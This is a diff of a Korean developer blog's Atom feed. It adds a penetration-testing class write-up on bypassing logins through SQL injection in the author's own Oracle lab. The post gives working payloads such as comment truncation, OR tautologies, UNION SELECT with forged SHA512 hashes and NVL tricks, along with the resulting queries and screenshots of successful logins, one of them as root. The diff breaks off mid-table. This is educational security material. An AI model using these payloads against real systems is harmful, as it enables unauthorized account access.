@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-04-14T16:24:58+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoiZmxvd2NoYXJ0IFREXG5BW-uhnOq3uOyduCDsi5zrj4RdIC0tPiBCW-uhnOq3uOyduCDrsKnsi51dXG5CIC0tPiB87IS47IWYIOygleuztCDsl4bsnYx8IENb66Gc6re47JWE7JuDIOyDge2DnOyXkOyEnCDroZzqt7jsnbhdXG5CIC0tPiB87IS47IWYIOygleuztCDsnojsnYx8IERb7IS47IWYIOygleuztCDtmZXsnbhdXG5EIC0tPiBFW-q4sOqwhCDrp4zro4wg7ZmV7J24XVxuRSAtLT4gfFl8IENcbkUgLS0-IHxOfCBGW-yEuOyFmElE66GcIOygleuztCDqsIDsoLjsmKTquLBdXG5GIC0tPiBHW-yEseqztV1cbkMgLS0-IEhbSUQgLCBQV0Qg7J6F66ClXVxuSCAtLT4gSVvshLjshZjsoJXrs7Qg7IOd7ISxXVxuSSAtLT4gRyIsIm1lcm1haWQiOm51bGx9" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-04-19T20:52:29+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoiZmxvd2NoYXJ0IFREXG5BW-uhnOq3uOyduCDsi5zrj4RdIC0tPiBCW-uhnOq3uOyduCDrsKnsi51dXG5CIC0tPiB87IS47IWYIOygleuztCDsl4bsnYx8IENb66Gc6re47JWE7JuDIOyDge2DnOyXkOyEnCDroZzqt7jsnbhdXG5CIC0tPiB87IS47IWYIOygleuztCDsnojsnYx8IERb7IS47IWYIOygleuztCDtmZXsnbhdXG5EIC0tPiBFW-q4sOqwhCDrp4zro4wg7ZmV7J24XVxuRSAtLT4gfFl8IENcbkUgLS0-IHxOfCBGW-yEuOyFmElE66GcIOygleuztCDqsIDsoLjsmKTquLBdXG5GIC0tPiBHW-yEseqztV1cbkMgLS0-IEhbSUQgLCBQV0Qg7J6F66ClXVxuSCAtLT4gSVvshLjshZjsoJXrs7Qg7IOd7ISxXVxuSSAtLT4gRyIsIm1lcm1haWQiOm51bGx9" /></p>
 
 <p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAo67iM65287Jqw7KCAKSAtPj4g7ISc67KEIDog66Gc6re47JWE7JuDIOyalOyyrVxu7ISc67KEIC0-PiDshJzrsoQgOiBzZXNzaW9uIGlkIOyCreygnFxu7ISc67KEIC0-PiDsgqzsmqnsnpAo67iM65287Jqw7KCAKSA6IOuhnOq3uOyduCDtjpjsnbTsp4Dso7zshowg66as64uk7J2066CJ7Yq4IOydkeuLtVxu7IKs7Jqp7J6QKOu4jOudvOyasOyggCkgLT4-IOyEnOuyhCA6IOuhnOq3uOyduCDtjpjsnbTsp4Ag7JqU7LKtXG7shJzrsoQgLT4-IOyCrOyaqeyekCjruIzrnbzsmrDsoIApIDog66Gc6re47J24IO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>
 
@@ -20,7 +20,793 @@
 <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">response</span><span class="o">.</span><span class="na">sendRedirect</span><span class="o">(</span><span class="s">"/sign_in_page"</span><span class="o">);</span>
 <span class="err"> </span> <span class="err"> </span> <span class="o">}</span>
 <span class="o">}</span>
-</code></pre></div></div>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">웹서버 만들기(7)</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C7/" rel="alternate" type="text/html" title="웹서버 만들기(7)" /><published>2023-04-14T00:00:00+09:00</published><updated>2023-04-15T00:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C7</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C7/"><![CDATA[<ul>
+</code></pre></div></div>
+<blockquote>
+  <p>test</p>
+</blockquote>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">SQL Injection 로그인 우회</title><link href="http://localhost:4000/SQLInjection/" rel="alternate" type="text/html" title="SQL Injection 로그인 우회" /><published>2023-04-19T00:00:00+09:00</published><updated>2023-04-19T23:13:00+09:00</updated><id>http://localhost:4000/SQLInjection</id><content type="html" xml:base="http://localhost:4000/SQLInjection/"><![CDATA[<h2 id="sql-injection-이란">SQL Injection 이란?</h2>
+<ul>
+  <li>sql 질의문을 삽입하는 공격이다. 즉 sql 질의문에 악의적인 코드를 배치하는 공격이다.</li>
+  <li>웹 해킹 기술중 하나이다.</li>
+</ul>
+
+<blockquote>
+  <p>목적</p>
+  <ul>
+    <li>정보 유출</li>
+    <li>저장된 데이터 유출 및 조작</li>
+    <li>인증 우회</li>
+  </ul>
+</blockquote>
+
+<blockquote>
+  <p>실습 환경</p>
+  <ul>
+    <li>DB 서버 : Rocky-8.7</li>
+    <li>DB 버전 : oracle-database-xe-21c</li>
+  </ul>
+</blockquote>
+
+<blockquote>
+  <p><strong>members</strong> 테이블 구조</p>
+</blockquote>
+
+<table>
+  <thead>
+    <tr>
+      <th>sid</th>
+      <th>id</th>
+      <th>password</th>
+      <th>email</th>
+      <th>info</th>
+      <th>hashpwd</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>integer PRIMARY KEY</td>
+      <td>VARCHAR(60)</td>
+      <td>VARCHAR(60)</td>
+      <td>VARCHAR(60)</td>
+      <td>VARCHAR(60)</td>
+      <td>CHAR(128)</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li><strong>hashpwd</strong> 컬럼은 password를 해시(SHA512) 암호화를 한 것 이다.</li>
+  <li>실제로 유저 정보를 저장하기 위한 테이블을 구성할 때는 해시 암호화된 비밀번호만 저장해야한다.</li>
+</ul>
+
+<p><br /><br /></p>
+<h2 id="로그인-방식에-따른-sql-인젝션-공격방식">로그인 방식에 따른 sql 인젝션 공격방식</h2>
+<ul>
+  <li>식별
+    <ul>
+      <li>많은 데이터 중에서 특별한 데이터를 가려내는것.</li>
+    </ul>
+  </li>
+  <li>인증
+    <ul>
+      <li>그 사람이 맞는지 확인하는 작업. ( 비밀번호 인증 )</li>
+    </ul>
+  </li>
+</ul>
+
+<h4 id="1-식별과-인증을-동시에-할-때">1. 식별과 인증을 동시에 할 때</h4>
+<ul>
+  <li>하나의 <code class="language-plaintext highlighter-rouge">sql 질의문</code> 으로 식별과 인증을 완료한다.</li>
+</ul>
+
+<blockquote>
+  <p>로그인방법</p>
+  <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">members</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'아이디'</span> <span class="k">and</span> <span class="n">PASSWORD</span><span class="o">=</span><span class="s1">'비번'</span>
+</code></pre></div>  </div>
+  <ul>
+    <li><strong>아이디</strong>와 <strong>비밀번호</strong>를 동시에 일치하면 사용자 정보가 나온다. 이러한 정보가 나오면 로그인에 성공한 것이다.</li>
+    <li>하지만 아무 정보도 안나오면 로그인에 실패 한 것이다.</li>
+  </ul>
+</blockquote>
+
+<blockquote>
+  <p>로그인 코드
+<script src="https://gist.github.com/MinGyu2/348f7a0e850908a350bb766f307d8e9a.js"></script></p>
+  <ul>
+    <li>다음 코드를 통해 인증을 한다.
+      <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">var</span> <span class="n">member</span> <span class="o">=</span> <span class="n">auth</span><span class="o">.</span><span class="na">authAndMember</span><span class="o">(</span><span class="n">id</span><span class="o">,</span> <span class="n">pwd</span><span class="o">);</span>
+</code></pre></div>      </div>
+    </li>
+  </ul>
+</blockquote>
+
+<blockquote>
+  <p>정상적인 로그인<br />
+<img src="https://user-images.githubusercontent.com/31990118/232983137-92129ab9-a389-43c0-93b9-46e70de832ce.png" alt="Pasted image 20230419141436" /><br /><img src="https://user-images.githubusercontent.com/31990118/232983198-a896785d-032c-47a7-9dac-905c0a7fe3a8.png" alt="Pasted image 20230419141453" /></p>
+</blockquote>
+
+<p><br /></p>
+<blockquote>
+  <p><strong>공격 방법</strong></p>
+</blockquote>
+
+<ul>
+  <li><strong>주석을 이용한 인증우회(1)</strong></li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th>입력</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>id</td>
+      <td><code class="language-plaintext highlighter-rouge">user2'--</code></td>
+    </tr>
+    <tr>
+      <td>pwd</td>
+      <td>` `</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>서버에서 완성된 쿼리문<br />
+<code class="language-plaintext highlighter-rouge">select * from members where id='user2'--' and PASSWORD=' '</code><br /><img src="https://user-images.githubusercontent.com/31990118/232983978-af5bd6a4-cc9b-4c5b-a130-155f58121b71.png" alt="Pasted image 20230419044643" /><br /><img src="https://user-images.githubusercontent.com/31990118/232984069-0c3d894b-edfe-43c0-a4b2-04349fee4065.png" alt="Pasted image 20230419044620" /></li>
+</ul>
+
+<p><br /></p>
+<ul>
+  <li><strong>주석을 이용한 인증우회(2)</strong></li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th>입력</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>id</td>
+      <td><code class="language-plaintext highlighter-rouge">user2'/*</code></td>
+    </tr>
+    <tr>
+      <td>pwd</td>
+      <td><code class="language-plaintext highlighter-rouge">*/and '1'='1</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>서버에서 완성된 쿼리문<br />
+<code class="language-plaintext highlighter-rouge">select * from members where id='user2'/*' and password='*/and '1'='1';</code><br /><img src="https://user-images.githubusercontent.com/31990118/232984619-32b03055-7784-4d7b-ad5e-15a7bf6f1dd8.png" alt="Pasted image 20230419141124" /><br /><img src="https://user-images.githubusercontent.com/31990118/232984682-5b1c1f8e-bd5b-442c-a209-f732dcf21e26.png" alt="Pasted image 20230419141032" /></li>
+  <li>블럭 단위로 주석처리 하였다.</li>
+</ul>
+
+<p><br /></p>
+<ul>
+  <li><strong>or 이용한 인증우회</strong></li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th>입력</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>id</td>
+      <td><code class="language-plaintext highlighter-rouge">user2' or '1'='1</code></td>
+    </tr>
+    <tr>
+      <td>pwd</td>
+      <td>` `</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>서버에서 완성된 쿼리문<br />
+<code class="language-plaintext highlighter-rouge">select * from members where id='user2' or '1'='1' and PASSWORD=' '</code><br /><img src="https://user-images.githubusercontent.com/31990118/232984798-75e83f27-fab3-4e09-b546-9f1bad9dff19.png" alt="Pasted image 20230419141300" /><br /><img src="https://user-images.githubusercontent.com/31990118/232984846-083c960b-50c9-4344-b391-e4486fb22736.png" alt="Pasted image 20230419141331" /></li>
+  <li>비교연산자 우선순위에 의해 and 연산자 부분을 먼저 계산을 하고 or 연산을 계산한다.<br /><code class="language-plaintext highlighter-rouge">select * from members where (id='user2' or ('1'='1' and PASSWORD=' '))</code></li>
+</ul>
+
+<p><br /><br /></p>
+<h4 id="2-식별과-인증을-따로-할-때">2. 식별과 인증을 따로 할 때</h4>
+
+<blockquote>
+  <p>로그인방법</p>
+  <ol>
+    <li>유저가 입력한 id와 <code class="language-plaintext highlighter-rouge">sql 질의문</code>을 통해 id 정보와 비밀번호 정보를 불러온다.<br /><code class="language-plaintext highlighter-rouge">select id,PASSWORD from members where id='아이디' </code></li>
+    <li>입력받은 비밀번호와 db 에서 불러온 비밀번호를 비교하여 일치하는지 확인한다.</li>
+    <li>일치하면 db 에서 불러온 id 정보를 통해 나머지 유저 정보도 불러온다.<br /><code class="language-plaintext highlighter-rouge">select * from members  where id='db에서 불러온 id정보';</code></li>
+  </ol>
+</blockquote>
+
+<blockquote>
+  <p>로그인 코드<br /><script src="https://gist.github.com/MinGyu2/7714a6942bb2726177f0dcbfef5caaa7.js"></script></p>
+</blockquote>
+
+<blockquote>
+  <p>정상적인 로그인<br />
+<img src="https://user-images.githubusercontent.com/31990118/232985187-5a0d4782-8d8a-4f53-bdd6-c6e636026a14.png" alt="Pasted image 20230419141842" /><br /><img src="https://user-images.githubusercontent.com/31990118/232985264-660444cd-f648-4933-8b3f-fb4b7d6e91c6.png" alt="Pasted image 20230419141903" /></p>
+</blockquote>
+
+<blockquote>
+  <p>union을 이용한 우회 공격 전 정확한 <strong>컬럼 수</strong> 찾기</p>
+  <ul>
+    <li><code class="language-plaintext highlighter-rouge">order by</code> 를 이용한다.</li>
+    <li><code class="language-plaintext highlighter-rouge">user2' order by 2 -- </code> 로그인 성공<br /><img src="https://user-images.githubusercontent.com/31990118/232985373-2f1890c3-e762-43ce-a675-28c7904f68ed.png" alt="Pasted image 20230419141937" /><br /><img src="https://user-images.githubusercontent.com/31990118/232985437-96a4348c-56d8-4fe1-bd1c-9628a2324d0c.png" alt="Pasted image 20230419141951" /></li>
+    <li><code class="language-plaintext highlighter-rouge">user2' order by 3 -- </code> 로그인 실패<br /><img src="https://user-images.githubusercontent.com/31990118/232985581-b986925c-674e-45f9-a0a3-2d13dedb546d.png" alt="Pasted image 20230419142020" /><br /><img src="https://user-images.githubusercontent.com/31990118/232985629-99e7085d-df98-4268-b513-18ce477eb459.png" alt="Pasted image 20230419142050" /></li>
+    <li>즉 컬럼의 수가 2개인 것을 확인할 수 있다.</li>
+  </ul>
+</blockquote>
+
+<p><br /></p>
+<blockquote>
+  <p>공격 방법</p>
+</blockquote>
+
+<ul>
+  <li><strong>union + 주석 사용</strong></li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th>입력</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>id</td>
+      <td><code class="language-plaintext highlighter-rouge">x' union select 'user2','user2' from dual -- </code></td>
+    </tr>
+    <tr>
+      <td>pwd</td>
+      <td><code class="language-plaintext highlighter-rouge">user2</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>서버에서 완성된 쿼리문<br />
+<code class="language-plaintext highlighter-rouge">select id,PASSWORD from members where id='x' union select 'user2','user2' from dual where '1'='1'</code><br /><img src="https://user-images.githubusercontent.com/31990118/232985841-7099d8b7-0441-4a9f-a001-5568d8614c67.png" alt="Pasted image 20230419142133" /><br /><img src="https://user-images.githubusercontent.com/31990118/232985915-ea61d625-85cd-4bca-9e58-dd7836dc3101.png" alt="Pasted image 20230419142152" /></li>
+</ul>
+
+<p><br /></p>
+<ul>
+  <li><strong>union + where 사용</strong></li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th>입력</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>id</td>
+      <td><code class="language-plaintext highlighter-rouge">x' union select 'user2','user2' from dual where '1'='1</code></td>
+    </tr>
+    <tr>
+      <td>pwd</td>
+      <td><code class="language-plaintext highlighter-rouge">user2</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>서버에서 완성된 쿼리문<br />
+<code class="language-plaintext highlighter-rouge">select id,PASSWORD from members where id='x' union select 'user2','user2' from dual where '1'='1'</code><br /><img src="https://user-images.githubusercontent.com/31990118/232986108-6e532e72-4254-4531-9464-ef82413d123f.png" alt="Pasted image 20230419142239" />
+<br /><img src="https://user-images.githubusercontent.com/31990118/232986157-f68af392-ddb2-4a6b-829e-62e9ce649116.png" alt="Pasted image 20230419142252" /></li>
+</ul>
+
+<p><br /><br /></p>
+<h4 id="3-식별과-인증을-동시에-할-때-hash-암호화된-비밀번호">3. 식별과 인증을 동시에 할 때(+ HASH 암호화된 비밀번호)</h4>
+<ul>
+  <li>웹서버는 사용자 사용하는 비밀번호를 HASH 암호화 하여 서버에 저장한다.</li>
+</ul>
+
+<blockquote>
+  <p>로그인 방법</p>
+  <ul>
+    <li>하나의 <code class="language-plaintext highlighter-rouge">sql 질의문</code> 으로 식별과 인증을 완료한다는 것이다.
+      <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">members</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'입력id'</span> <span class="k">and</span> <span class="n">hashpwd</span><span class="o">=</span><span class="n">standard_hash</span><span class="p">(</span><span class="s1">'입력 pwd'</span><span class="p">,</span><span class="s1">'SHA512'</span><span class="p">);</span>
+</code></pre></div>      </div>
+    </li>
+    <li>웹 서버에서 pwd 를 바로 비교하는것이 아닌 <strong>SHA512</strong> 알고리즘으로 HASH 암호화한 값을 비교한다.</li>
+    <li><strong>아이디</strong>와 <strong>비밀번호</strong>를 동시에 일치하면 유저 정보가 나온다. 이러한 정보가 나오면 로그인에 성공한 것이다.</li>
+    <li>하지만 아무 정보도 안나오면 로그인에 실패 한 것이다.</li>
+  </ul>
+</blockquote>
+
+<blockquote>
+  <p>로그인 코드 <br />
+<script src="https://gist.github.com/MinGyu2/10015945943d3c562131ca34225b8529.js"></script></p>
+</blockquote>
+
+<blockquote>
+  <p>정상적인 로그인<br /><img src="https://user-images.githubusercontent.com/31990118/232986886-8bd775f2-b4ea-4d8f-81b5-1052e894f004.png" alt="Pasted image 20230419142438" />
+<br /><img src="https://user-images.githubusercontent.com/31990118/232986977-ab3e49bb-012e-40a8-b726-725242bf5d8d.png" alt="Pasted image 20230419142455" /></p>
+</blockquote>
+
+<blockquote>
+  <p>nvl 함수</p>
+  <ul>
+    <li>nvl 함수는 값이 null 인 경우 지정값을 출력하고 , 값이 null 아니면 그대로 출력한다.</li>
+    <li>nvl(값,  지정값)</li>
+    <li>‘1’ 은 null 이 아니다. 따라서 1이 출력된다.<br /><img src="https://user-images.githubusercontent.com/31990118/232987098-fed02520-2eab-4f8d-bf02-4e386a3d8166.png" alt="Pasted image 20230419143825" /></li>
+  </ul>
+</blockquote>
+
+<p><br /></p>
+<blockquote>
+  <p>공격 방법</p>
+</blockquote>
+
+<ul>
+  <li><strong>주석사용</strong></li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th>입력</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>id</td>
+      <td><code class="language-plaintext highlighter-rouge">user2' -- </code></td>
+    </tr>
+    <tr>
+      <td>pwd</td>
+      <td>` `</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>서버에서 완성된 쿼리문<br />
+<code class="language-plaintext highlighter-rouge">select id from members where id='user2' -- ' and hashpwd=standard_hash('ksdjfaklsf','SHA512')</code><br /><img src="https://user-images.githubusercontent.com/31990118/232990015-656e3828-1f9c-44ac-aef5-404079e11f67.png" alt="Pasted image 20230419142553" />
+<br /><img src="https://user-images.githubusercontent.com/31990118/232990061-98b4cd2b-84f9-4ffb-85f8-3398a26fe40d.png" alt="Pasted image 20230419142616" /></li>
+</ul>
+
+<p><br /><br /></p>
+<ul>
+  <li><strong>주석 + or + nvl사용</strong> (members 테이블의 가장 상위에 있는 root 로 로그인된다.)</li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th>입력</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>id</td>
+      <td><code class="language-plaintext highlighter-rouge">user2'/*</code></td>
+    </tr>
+    <tr>
+      <td>pwd</td>
+      <td><code class="language-plaintext highlighter-rouge">*/ or '1'=nvl('1</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>서버에서 완성된 쿼리문<br />
+<code class="language-plaintext highlighter-rouge">select id from members where id='user2'/*' and hashpwd=standard_hash('*/ or '1'=nvl('1','SHA512')</code><br /><img src="https://user-images.githubusercontent.com/31990118/232990160-db93d3d4-95cc-4498-90b2-0d20d2a552df.png" alt="Pasted image 20230419142842" />
+<br /><img src="https://user-images.githubusercontent.com/31990118/232990195-078251e2-8dec-4601-9bb3-b84fcd2eb24f.png" alt="Pasted image 20230419142857" /></li>
+  <li>여기서 user2 사용자가 아닌 root로 로그인 된 것을 확인할 수 있다.</li>
+  <li>서버에서 완성된 쿼리는 모든 사용자 정보를 불러오고 서버는 사용자 정보들 중 맨위에 존재하는 사용자의 정보를 가져와 보여준다.</li>
+  <li>
+    <p>테이블 맨위에는 root 사용자가 존재하여 root 계정으로 로그인된 것 이다.
+<br /><br /></p>
+  </li>
+  <li><strong>주석 + and + nvl사용</strong></li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th>입력</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>id</td>
+      <td><code class="language-plaintext highlighter-rouge">user2'/*</code></td>
+    </tr>
+    <tr>
+      <td>pwd</td>
+      <td><code class="language-plaintext highlighter-rouge">*/ and '1'=nvl('1</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>서버에서 완성된 쿼리문<br />
+<code class="language-plaintext highlighter-rouge">select id from members where id='user2'/*' and hashpwd=standard_hash('*/ and '1'=nvl('1','SHA512')</code><br /><img src="https://user-images.githubusercontent.com/31990118/232990461-99c1e174-9ff6-4b03-ad3c-a65c52e55953.png" alt="Pasted image 20230419144106" /><br /><img src="https://user-images.githubusercontent.com/31990118/232990496-9034bd9e-eb22-41a4-8351-925d908d97e8.png" alt="Pasted image 20230419144117" /></li>
+</ul>
+
+<p><br /><br /></p>
+<ul>
+  <li><strong>or 이용하기</strong></li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th>입력</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>id</td>
+      <td><code class="language-plaintext highlighter-rouge">user2' or '1'='1</code></td>
+    </tr>
+    <tr>
+      <td>pwd</td>
+      <td>` `</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>서버에서 완성된 쿼리문<br />
+<code class="language-plaintext highlighter-rouge">select id from members where id='user2' or '1'='1' and hashpwd=standard_hash(' ','SHA512')</code><br /><img src="https://user-images.githubusercontent.com/31990118/232990748-9179397a-d4e8-4f39-b657-bbbcf04faa9c.png" alt="Pasted image 20230419143137" /><br /><img src="https://user-images.githubusercontent.com/31990118/232990788-47801f8e-ce8b-453b-a9a3-b43bb8ba0b98.png" alt="Pasted image 20230419143153" /></li>
+</ul>
+
+<p><br /><br /></p>
+<h4 id="4-식별과-인증을-따로-할-때-비밀번호-sha512-하여-table에-저장">4. 식별과 인증을 따로 할 때(+ 비밀번호 SHA512 하여 table에 저장)</h4>
+
+<blockquote>
+  <p>로그인 방법</p>
+  <ol>
+    <li>유저가 입력한 id와 <code class="language-plaintext highlighter-rouge">sql 질의문</code>을 통해 id 정보와 해시로 저장된 비밀번호 정보를 불러온다.<br /><code class="language-plaintext highlighter-rouge">select id,hashpwd from members where id='아이디'</code></li>
+    <li>유저가 입력한 비밀번호를 해시 암호화 알고리즘을 통해 암호화 한다.</li>
+    <li>유저가 입력한 해시화 된 비밀번호와 db에서 불러온 해시화된 비밀번호를 비교한다.</li>
+    <li>서로 일치하면 db 에서 불러온 <code class="language-plaintext highlighter-rouge">id</code> 정보를 이용하여 나머지 유저 정보도 불러온다.</li>
+  </ol>
+</blockquote>
+
+<blockquote>
+  <p>코드<br /><script src="https://gist.github.com/MinGyu2/3ba980c0793432ddb51eb184be586ff3.js"></script></p>
+</blockquote>
+
+<blockquote>
+  <p>정상적인 로그인<br /><img src="https://user-images.githubusercontent.com/31990118/232991349-687a4c81-ef26-4c32-80b0-5bc5760cfecc.png" alt="Pasted image 20230419150421" />
+<br /><img src="https://user-images.githubusercontent.com/31990118/232991402-b32657e8-1f6d-4feb-8c64-8ca1f3728d20.png" alt="Pasted image 20230419150437" /></p>
+</blockquote>
+
+<blockquote>
+  <p>정확한 컬럼 수 찾기</p>
+  <ul>
+    <li><code class="language-plaintext highlighter-rouge">order by</code> 를 이용한다.</li>
+    <li><code class="language-plaintext highlighter-rouge">user2' order by 2 -- </code> 로그인 성공<br /><img src="https://user-images.githubusercontent.com/31990118/232991510-58554a20-098d-4531-b5e1-f664afcb53b3.png" alt="Pasted image 20230419144418" /></li>
+    <li>컬럼수가 2개라는 것을 알 수 있다.</li>
+  </ul>
+</blockquote>
+
+<p><br /></p>
+<blockquote>
+  <p>공격방법</p>
+</blockquote>
+
+<ul>
+  <li><strong>union 을 이용한다.</strong></li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th>입력</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>id</td>
+      <td><code class="language-plaintext highlighter-rouge">2' union select 'user2', cast(standard_hash('user2','SHA512') as char(128)) from dual --</code></td>
+    </tr>
+    <tr>
+      <td>pwd</td>
+      <td><code class="language-plaintext highlighter-rouge">user2</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>서버에서 완성된 쿼리문<br />
+<code class="language-plaintext highlighter-rouge">select id,hashpwd from members where id='x' union select 'user2', cast(standard_hash('user2','SHA512') as char(128)) from dual -- '</code><br /><img src="https://user-images.githubusercontent.com/31990118/233049085-c016daf8-8467-47ad-8d63-26668bfc33ac.png" alt="Pasted image 20230419145121" />
+<br /><img src="https://user-images.githubusercontent.com/31990118/233049124-051680f1-71c0-45d5-b569-ff429fa6581a.png" alt="Pasted image 20230419145133" /></li>
+</ul>
+
+<p><br /></p>
+<ul>
+  <li><strong>직접 해시 암호한 값을 넣어준다.</strong></li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th>입력</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>id</td>
+      <td><code class="language-plaintext highlighter-rouge">2' union select 'user2', hash('a','SHA512') from dual --</code></td>
+    </tr>
+    <tr>
+      <td>pwd</td>
+      <td><code class="language-plaintext highlighter-rouge">a</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>hash(‘a’,’SHA512’) = <code class="language-plaintext highlighter-rouge">1F40FC92DA241694750979EE6CF582F2D5D7D28E18335DE05ABC54D0560E0F5302860C652BF08D560252AA5E74210546F369FBBBCE8C12CFC7957B2652FE9A75</code></li>
+  <li>서버에서 완성된 쿼리문<br />
+<code class="language-plaintext highlighter-rouge">select id,hashpwd from members where id='2' union select 'user2', '1F40FC92DA241694750979EE6CF582F2D5D7D28E18335DE05ABC54D0560E0F5302860C652BF08D560252AA5E74210546F369FBBBCE8C12CFC7957B2652FE9A75' from dual --'</code><br /><img src="https://user-images.githubusercontent.com/31990118/233049465-179b0584-4be4-4702-a13a-e7ed0bb58b3c.png" alt="Pasted image 20230419145351" />
+<br /><img src="https://user-images.githubusercontent.com/31990118/233049512-f9fe88e5-5ccb-4863-89e5-be94b3eaef62.png" alt="Pasted image 20230419145407" /></li>
+</ul>
+
+<p><br /></p>
+
+<ul>
+  <li><strong>주석 없이 하기</strong></li>
+</ul>
+
+<table>
+  <thead>
